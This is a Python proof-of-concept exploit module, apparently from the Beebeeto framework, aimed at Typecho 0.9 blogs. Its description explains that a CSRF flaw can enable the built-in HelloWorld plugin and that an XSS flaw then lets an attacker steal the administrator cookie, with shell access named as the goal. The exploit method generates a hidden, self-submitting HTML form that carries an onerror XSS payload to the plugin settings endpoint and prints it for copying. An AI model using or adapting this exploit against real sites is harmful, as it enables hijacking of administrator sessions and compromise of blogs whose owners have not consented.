#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""


from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0104',
            'name': 'Typecho 0.9 HelloWorld Plugin CSRF&XSS&Getshell Exploit',
            'author': '雷蜂',
            'create_date': '2014-10-22',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Typecho',
            'vul_version': ['0.9'],
            'type': 'Cross Site Request Forgery',
            'tag': ['Typecho漏洞', 'CSRF', 'HelloWorld Plugin', 'php', 'Getshell'],
            'desc': '''
                    Typecho 0.9(13.12.12)是一款国内流行的PHP Blog系统，其程序内置Hello,World插件(默认关闭)存在CSRF漏洞可开启插件。
                    插件开启后会在菜单显示简单介绍，存在XSS漏洞，CSRF&XSS配合后可获取管理员Cookie进入后台。
                    ''',
            'references': ['http://www.hackersoul.com/typecho/ff0000-hsdb-0001.html',
            ],
        },
    }


    @classmethod
    def exploit(cls, args):
        verify_url = args['options']['target'] + '/index.php/action/plugins-edit?config=HelloWorld'
        if args['options']['verbose']:
            print '[*] Generation: ' + verify_url
        temp = '''
        <div style="display: none;">
        <img src="%s" />
        <form action="%s" method="post" enctype="application/x-www-form-urlencoded" name="ff0000team">
        <input name="word" value="<img src=@ onerror=alert(222)>">
        <button type="submit"></button>
        </form>
        </div>
        <script>
        setTimeout("document.ff0000team.submit()", 3000);
        </script>
        ''' % (verify_url, verify_url)
        print '[*] Copy code: ' + temp
        print '[*] Specific use: ' + str(MyPoc.poc_info['vul']['references'])
        args['success'] = True
        args['poc_ret']['vul_url'] = 'Generation ok'
        return args

    verify = exploit


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())